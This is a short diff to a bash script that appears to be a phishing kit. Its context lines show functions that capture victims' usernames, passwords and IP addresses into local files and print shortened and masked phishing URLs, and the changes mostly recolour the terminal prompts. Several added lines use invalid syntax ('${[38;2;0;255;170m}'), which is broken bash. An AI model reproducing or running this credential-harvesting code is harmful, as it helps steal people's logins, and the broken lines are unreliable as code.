@@ -386,7 +386,7 @@ about() {
 cusport() {
 	echo
 
-${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${WHITE}
+echo -ne "${RED}[${WHITE}-${RED}][38;2;0;255;170m Select a port forwarding service : ${WHITE}"
 	
 	read -n1 -p "${RED}[${WHITE}?${RED}][38;2;0;255;170m Do You Want A Custom Port ${WHITE}[${BLUE}y${WHITE}/${BLUE}N${WHITE}]: ${BLUE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
@@ -431,12 +431,12 @@ capture_creds() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
+	echo -ne "\n${RED}[${WHITE}-${RED}]${WHITE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${WHITE}to exit. "
 }
 
 ## Print data
 capture_data() {
-	echo -ne "\n${RED}[${WHITE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
+	echo -ne "\n${RED}[${WHITE}-${RED}]${WHITE} Waiting for Login Info, ${BLUE}Ctrl + C ${WHITE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
 			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
@@ -603,9 +603,9 @@ custom_url() {
 		processed_url="Unable to Short URL"
 	fi
 
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$url"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${ORANGE}$processed_url"
-	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${ORANGE}$masked_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${[38;2;0;255;170m}$url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${[38;2;0;255;170m}$processed_url"
+	[[ $processed_url != *"Unable"* ]] && echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 3 : ${[38;2;0;255;170m}$masked_url"
 }
 
 ## Facebook
